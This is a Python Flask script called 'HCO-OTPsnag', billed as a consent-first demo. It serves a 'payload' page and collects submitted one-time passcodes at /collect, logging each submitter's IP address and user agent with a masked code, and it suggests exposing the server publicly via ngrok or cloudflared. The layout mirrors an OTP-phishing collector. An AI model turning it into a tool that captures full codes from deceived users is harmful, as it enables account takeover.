#!/usr/bin/env python3
"""
HCO-OTPsnag — Consent-first demo

Flow:
1. Prints a message and opens your YouTube channel in the system browser.
2. Waits 8 seconds.
3. Prints the big red box with green text ("HCO OTP Snag / by Azhar").
4. Starts a Flask server that serves /payload (consent-first OTP form) and /collect to receive submissions.
Use cloudflared/ngrok to expose the server if you want to open the page from another device.
"""

import os
import time
import webbrowser
from flask import Flask, request, render_template_string, jsonify
from datetime import datetime

# CONFIG
YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
PORT = int(os.getenv("PORT", 8080))
HOST = os.getenv("HOST", "0.0.0.0")
LOGFILE = "consented_otps.log"

app = Flask(__name__)

# load payload html from file
HERE = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(HERE, "payload.html"), "r", encoding="utf-8") as f:
    PAYLOAD_HTML = f.read()

def print_red_box():
    # red background / bold green text inside ASCII box (ANSI)
    RED_BG = "\033[41m"
    GREEN = "\033[32m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

    lines = ["HCO OTP Snag", "by Azhar"]
    width = max(len(l) for l in lines) + 6
    top = "╔" + "═" * width + "╗"
    bottom = "╚" + "═" * width + "╝"
    print(RED_BG + top + RESET)
    for line in lines:
        pad = width - len(line)
        left = pad // 2
        right = pad - left
        print(RED_BG + "║" + RESET + " " * left + BOLD + GREEN + line + RESET + " " * right + RED_BG + "║" + RESET)
    print(RED_BG + bottom + RESET)

def log_submission(data):
    with open(LOGFILE, "a", encoding="utf-8") as f:
        ts = datetime.utcnow().isoformat() + "Z"
        entry = {"ts": ts, "from_ip": data.get("from_ip"), "ua": data.get("ua"), "otp_preview": data.get("otp_preview"), "note": data.get("note", "")}
        f.write(str(entry) + "\n")
    # Print in terminal clearly (this is the live output)
    print("\n\033[1;31m[+] Consented OTP Submission:\033[0m")
    print("  OTP (masked):", data.get("otp_preview"))
    print("  From IP:", data.get("from_ip"))
    print("  UA:", data.get("ua"))
    print("  Note:", data.get("note",""))
    print("  Time (UTC):", datetime.utcnow().isoformat() + "Z")
    print("--------------------------------------------------\n")

@app.route("/")
def index():
    return "<h3>HCO-OTPsnag — Consent-first demo. Visit /payload (consent required)</h3>"

@app.route("/payload")
def payload():
    # serve the consent-first payload
    return render_template_string(PAYLOAD_HTML)

@app.route("/collect", methods=["POST"])
def collect():
    """
    Expected JSON:
    { "consent": true, "otp": "...", "note": "..."}
    """
    data = request.get_json(force=True, silent=True) or {}
    remote = request.remote_addr
    ua = request.headers.get("User-Agent","")
    if not data.get("consent"):
        return jsonify({"status":"failed","reason":"no consent"}), 400
    otp = (data.get("otp","") or "").strip()
    if not otp:
        return jsonify({"status":"failed","reason":"no otp provided"}), 400

    # Mask OTP for display/storage (keep first and last char if length >=2)
    if len(otp) <= 2:
        preview = "*" * len(otp)
    else:
        preview = otp[0] + ("*" * (len(otp)-2)) + otp[-1]

    record = {
        "from_ip": remote,
        "ua": ua,
        "otp_preview": preview,
        "note": data.get("note","")
    }
    log_submission(record)
    # Respond and optionally redirect client to your YouTube or a thank you page
    return jsonify({"status":"ok","message":"Thank you — consented OTP recorded (masked)."}), 200

def main():
    # 1) Show message and open YouTube for 8 seconds
    print("This tool is not free. Redirecting to YouTube in 8 seconds...")
    try:
        webbrowser.open(YOUTUBE_URL)
    except Exception:
        # If webbrowser couldn't open (Termux environment may not), just print the URL for manual open
        print("Open this URL in your browser:", YOUTUBE_URL)
    time.sleep(8)

    # 2) Print red box with green text
    print_red_box()

    # 3) Start Flask server
    print(f"[*] Starting server on {HOST}:{PORT}")
    print(f"[*] Open the payload on your device (or expose with cloudflared/ngrok): http://{HOST if HOST!='0.0.0.0' else '127.0.0.1'}:{PORT}/payload")
    print("Tip: to test from another device use cloudflared or ngrok to create a public URL for /payload.")
    app.run(host=HOST, port=PORT)

if __name__ == "__main__":
    main()
